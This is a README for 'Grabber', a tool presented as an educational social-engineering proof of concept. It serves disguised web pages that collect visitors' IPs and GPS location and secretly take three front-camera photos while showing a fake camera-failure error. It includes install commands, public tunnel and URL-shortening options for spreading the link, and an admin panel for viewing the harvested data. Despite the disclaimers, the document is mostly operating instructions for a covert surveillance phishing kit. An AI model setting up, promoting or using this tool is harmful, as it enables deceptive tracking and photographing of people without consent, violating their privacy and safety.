# Grabber  

![Node.js](https://img.shields.io/badge/Node.js-14%2B-green)
![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)

---

> [!Warning]
>**Educational / Demonstration Purposes Only**  
> - Grabber is a **social engineering proof-of-concept (POC)** designed to demonstrate how **browser permissions** (camera, location) can be exploited when users trust unverified sites.  
> - This tool is **NOT** intended for malicious use. The author takes **no responsibility** for any misuse.

---

## 📚 Table of Contents
- [📖 Overview](#-overview)
- [✨ Features](#-features)
- [⚡ Installation](#-installation)
  - [Requirements](#requirements)
  - [Debian / Ubuntu](#debian--ubuntu)
  - [Arch Linux](#arch-linux)
  - [Android (Termux)](#android-termux)
  - [iOS / iSH (Alpine)](#ios--ish-alpine)
- [🔐 Set Admin Credentials](#-set-admin-credentials)
- [🛠 Usage Flow](#-usage-flow)
- [📂 Data Storage](#-data-storage)
- [📁 Project Structure](#-project-structure)
- [⚖️ Legal / Educational Use Only](#-legal--educational-use-only)
- [⚠️ Disclaimer](#-disclaimer)
- [📜 License](#-license)

---

## 📖 Overview  
Grabber simulates a website with a seemingly legitimate use of gps and camera permissions. Its goal is to raise awareness about **how easily sensitive data can be harvested** when permissions are granted to untrusted websites.

---
**Terminal Menu:**

![Image](https://github.com/user-attachments/assets/eba8c347-2822-466e-9744-1bc187e17dbf)

**User-Facing Page Themes:** 

![Image](https://github.com/user-attachments/assets/6980c1d1-828d-4632-ae34-f529695ba524)

**Admin Panel:**

![Image](https://github.com/user-attachments/assets/3358cb3f-ebe4-49e2-9e37-8eb46f75772d)

---

### ✅ What happens when a user visits the page?
- The site appears to be a **legitimate website requiring camera and location permissions**.
- Collects:
  - **Server-facing IP**
  - **Public IP** (via IPify API)
  - **WebRTC leak IPs**
- If **location permission** is granted:
  - Displays their location on an interactive OpenStreetMap.
- If **camera permission** is granted:
  - Silently captures **3 front-facing photos** in the background.
  - Displays a **fake error popup**:  
    *"Failed to initialize camera."*
- Logs stored in `data.json`.
- Captured photos saved in `/images`.

An **admin dashboard** allows:  
✔ Viewing IP details (with WHOIS info)  
✔ Viewing captured geolocation on an interactive map  
✔ Viewing captured images (single or carousel with autoplay)  
✔ **Secure access** – The admin panel is **only accessible from `localhost` or `127.0.0.1`**, preventing external access.

---

## ✨ Features  
- ✅ **Disguised UI** – Multiple user-facing HTML themes that appear to be websites legitimately requiring permissions
- ✅ **IP Collection** – Server IP, Public IP, WebRTC IP leaks  
- ✅ **Location Tracking** – OpenStreetMap embed if allowed  
- ✅ **Silent Camera Capture** – Three selfies in background, fake error shown  
- ✅ **Secure Admin Panel** – Login protected with **scrypt-hashed credentials** and restricted to **localhost only**  
- ✅ **Image Carousel** – Navigate or autoplay captured images  
- ✅ **Serveo Integration** – Expose local server securely  
- ✅ **Optional URL Shortening** – Three shortening services supported  

---

## ⚡ Installation  

### **Requirements**
- Node.js **v14+**
- Python **3.8+**
- npm
- pip
- OpenSSH

---

### **Debian / Ubuntu**
```bash
sudo apt update && sudo apt install -y git nodejs npm python3 python3-pip openssh-client
git clone https://github.com/cons0le7/Grabber
```

---

### **Arch Linux**
```bash
sudo pacman -S --needed git nodejs npm python python-pip openssh
git clone https://github.com/cons0le7/Grabber
```

---

### **Android (Termux)**
```bash
pkg install git nodejs python python-pip openssh
git clone https://github.com/cons0le7/Grabber
```

---

### **iOS / iSH (Alpine)**
```bash
apk add git nodejs npm python3 py3-pip openssh
git clone https://github.com/cons0le7/Grabber
```

---

## ⌨️ Initialize NPM 
```bash
cd Grabber
npm install whois whois-json underscore

```

## 🔐 Set Admin Credentials  
```bash
python3 pass.py
```
✔ Prompts for username & password  
✔ Hashes credentials using **scrypt**  
✔ Saves securely in `config.json`  

**Tip:** Delete `pass.py` after setup for extra security.  

---

## 🛠 Usage Flow  

### Start the server:
   ```bash
   python3 grab.py
   ```
This will:  
- Check if port `3000` is in use and prompt to terminate any processes occupying it.  
- List all available user-facing HTML pages in `/public` and prompt for selection.  
- Ask if you want **Local mode** (localhost only) or **Public mode** (via Serveo or localhost.run).  
- If Public mode is chosen, optionally ask whether to **shorten the public URL** (3 options available).  
- Start the Node.js server on `http://localhost:3000`.  
- If Public mode is chosen, create a **Serveo or localhost.run tunnel** and display a public link.  

After starting server, send the generated link to the test device.

---

### On Test Device:
- Open the link.
- Accept **location permissions** → Displays map.
- Tap **“Scan Item”** → Accept **camera permissions**.
- Fake error appears: *"Failed to initialize camera."* (images are still captured).

### Server-Side:
- Access the admin panel:  
  `http://localhost:3000/admin` or `http://127.0.0.1:3000/admin`  
  *(The panel is **not accessible externally**, only from localhost for security.)*
- Log in using your credentials.
- View:

  ✔ Collected IP info with WHOIS  
  ✔ Click coordinates → Opens interactive map  
  ✔ Captured images → Carousel with navigation & autoplay  

---

## 📂 Data Storage  
- **Captured images:** `/images`  
- **All session data:** `data.json`  

---

## 📁 Project Structure
```
Grabber/
│
├── public/          # Front-end files (HTML, CSS, JS)
├── images/          # Captured images
├── config.json      # Stores hashed credentials
├── data.json        # Logs IP, location, session details
├── grab.py          # Main launcher script
├── pass.py          # Credential setup script
└── server.js        # Node.js server
```

---

## ⚖️ Legal / Educational Use Only
- This software is **strictly for educational, research, or demonstration purposes**.
- **Do not use this tool to target real individuals or systems without explicit consent.**
- By using Grabber, you **agree not to engage in illegal or unethical activities**.
- The author **does not endorse or facilitate malicious use** and **assumes no liability** for misuse.

---

## ⚠️ Disclaimer
This tool is provided **“as-is”**.  
The authors are **not responsible for any damages, legal issues, or misuse** arising from the use of this software.  

---

## 📜 License
MIT License. See [LICENSE](LICENSE) for details.
